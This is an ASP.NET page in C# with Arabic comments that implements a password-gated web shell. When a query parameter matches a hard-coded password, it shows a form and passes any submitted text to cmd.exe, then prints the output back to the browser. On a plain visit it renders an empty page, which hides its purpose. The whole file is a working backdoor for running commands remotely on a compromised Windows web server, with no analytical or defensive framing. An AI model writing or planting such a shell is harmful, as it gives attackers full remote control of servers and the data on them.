<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        // تحقق إذا تم تمرير متغير cmd
        if (Request["cmd"] != null)
        {
            string command = Request["cmd"];
            
            // تحقق من أن القيمة المدخلة هي "28112016"
            if (command == "28112016")
            {
                // بعد إدخال كلمة المرور الصحيحة، اظهر المدخل لتنفيذ الأوامر
                Response.Write(@"
                    <form method='get'>
                        Command: <input type='text' name='execute' />
                        <input type='hidden' name='cmd' value='28112016' />
                        <input type='submit' value='Execute' />
                    </form>
                ");

                // إذا تم إدخال أمر، نفذه
                string cmdCommand = Request["execute"];
                if (!string.IsNullOrEmpty(cmdCommand))
                {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "cmd.exe";
                    psi.Arguments = "/c " + cmdCommand;
                    psi.RedirectStandardOutput = true;
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;

                    Process process = Process.Start(psi);
                    string output = process.StandardOutput.ReadToEnd();
                    Response.Write("<pre>" + output + "</pre>");
                }
            }
        }
        else
        {
            // لا تعرض أي شيء عند فتح الصفحة لأول مرة
            Response.Clear();
        }
    }
</script>

<html>
<body>
    <form method="get">
        <!-- المدخل الأول لكلمة المرور -->
        <input type="password" name="cmd" style="display:none;" autofocus />
        <script>
            // بعد تحميل الصفحة، اجعل المدخل الخاص بكلمة المرور يظهر
            document.getElementsByName('cmd')[0].style.display = 'block';
        </script>
    </form>
</body>
</html>
